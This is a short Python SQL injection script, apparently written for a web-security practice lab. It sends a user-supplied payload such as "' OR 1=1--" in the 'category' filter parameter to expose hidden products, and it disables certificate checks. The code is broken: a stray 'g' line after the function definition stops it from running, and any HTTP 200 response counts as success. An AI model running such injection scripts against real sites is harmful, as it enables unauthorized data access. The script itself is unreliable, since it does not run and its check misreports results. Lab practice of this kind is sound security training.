#sqli in where clause allowing retrieval of hidden data 
# 
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def exploit_sqli(url, payload):
g
    uri = "/filter?category="

    r = requests.get(
        url + uri + payload,
        verify=False
    )

    # Debugging output
    print(f"[+] Testing payload: {payload}")
    print(f"[+] Status code: {r.status_code}")
    print(f"[+] Response length: {len(r.text)}")

    # Check for evidence of unreleased products
    if "Unreleased" in r.text or r.status_code == 200:
        return True

    return False


if __name__ == "__main__":

    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f"[-] Example: {sys.argv[0]} http://example.com \"' OR 1=1--\"")
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQLi successful")

    else:
        print("[-] SQLi unsuccessful")